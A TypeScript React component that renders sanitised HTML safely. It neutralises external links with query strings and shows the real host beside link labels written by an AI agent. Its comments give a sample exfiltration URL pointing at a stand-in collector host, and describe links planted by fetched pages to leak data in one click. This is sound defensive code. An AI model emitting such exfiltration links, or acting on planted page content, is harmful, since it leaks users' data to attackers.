// Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
// SPDX-License-Identifier: MIT-0

import React from 'react';
import { Link as RouterLink } from 'react-router-dom';

import { hostOf } from '@/lib/format';
import { ALLOWED_TAGS, isSafeHref, resolvesInApp } from '@/lib/html';

/**
 * Renders server-sanitised HTML as React nodes, without dangerouslySetInnerHTML: the string is
 * parsed with DOMParser (which never executes scripts), allowlisted elements become React
 * elements, anything else is unwrapped to its text, and every link passes `isSafeHref` again.
 */
export default function SafeHtml({ html }: { html: string }): React.ReactElement {
  const nodes = React.useMemo(() => toReact(html), [html]);
  return <>{nodes}</>;
}

function toReact(html: string): React.ReactNode[] {
  if (!html) return [];
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
  return Array.from(doc.body.childNodes).map((n, i) => renderNode(n, String(i)));
}

function renderNode(node: Node, key: string): React.ReactNode {
  if (node.nodeType === Node.TEXT_NODE) return node.textContent;
  if (node.nodeType !== Node.ELEMENT_NODE) return null;
  const el = node as Element;
  const tag = el.tagName.toLowerCase();
  if (['script', 'style', 'iframe', 'object', 'template', 'svg', 'math', 'noscript'].includes(tag)) return null;
  const children = Array.from(el.childNodes).map((c, i) => renderNode(c, `${key}.${i}`));
  if (!ALLOWED_TAGS.has(tag)) return <React.Fragment key={key}>{children}</React.Fragment>;
  if (tag === 'br') return <br key={key} />;
  if (tag === 'a') return safeAnchor((el.getAttribute('href') ?? '').trim(), children, key);
  return React.createElement(tag, { key }, ...children);
}

/** One link under the shared rules: unsafe links become text, internal links stay in the app. */
export function safeAnchor(href: string, children: React.ReactNode, key: string): React.ReactNode {
  if (!isSafeHref(href)) return <React.Fragment key={key}>{children}</React.Fragment>;
  if (href.startsWith('/')) {
    if (!resolvesInApp(href)) return <React.Fragment key={key}>{children}</React.Fragment>;
    return (
      <RouterLink key={key} to={href}>
        {children}
      </RouterLink>
    );
  }
  if (href.startsWith('#')) {
    return (
      <a key={key} href={href}>
        {children}
      </a>
    );
  }
  // An external address with a query string or a fragment is not a live link, whatever the syntax:
  // "[x](https://collector.example/c?d=<a passage>)" or an <a href> planted by a fetched page would
  // otherwise send the passage away in one click, as a bare URL could before SR2-F01 (r3 F3-022).
  // The full address is shown, so it can still be read and copied.
  if (/[?#]/.test(href)) {
    return (
      <React.Fragment key={key}>
        {children} <span className="link-host">({href})</span>
      </React.Fragment>
    );
  }
  // Link text in agent output is model-written and can claim to be any site: always show where an
  // external link really goes, so a hostile label cannot hide an exfiltration URL.
  const host = hostOf(href);
  const labelled = typeof children === 'string' && children.trim().toLowerCase() === host.toLowerCase();
  return (
    <a key={key} href={href} target="_blank" rel="noopener noreferrer" title={href}>
      {children}
      {!labelled && <span className="link-host"> ({host})</span>}
    </a>
  );
}
